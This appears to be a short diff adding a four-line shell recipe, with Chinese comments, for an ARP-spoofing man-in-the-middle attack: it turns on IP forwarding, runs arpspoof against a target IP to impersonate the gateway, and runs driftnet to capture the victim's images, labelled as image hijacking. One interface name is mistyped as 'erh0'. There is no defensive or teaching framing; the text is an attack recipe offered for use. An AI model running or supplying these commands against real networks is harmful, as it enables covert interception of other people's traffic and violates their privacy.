@@ -1,0 +1,4 @@
+echo 1 > /proc/sys/net/ipv4/ip_forward #1是监听，0是断网
+arpspoof -i eth0 -t 网关 对方ip
+
+driftnet -i erh0 图片劫持
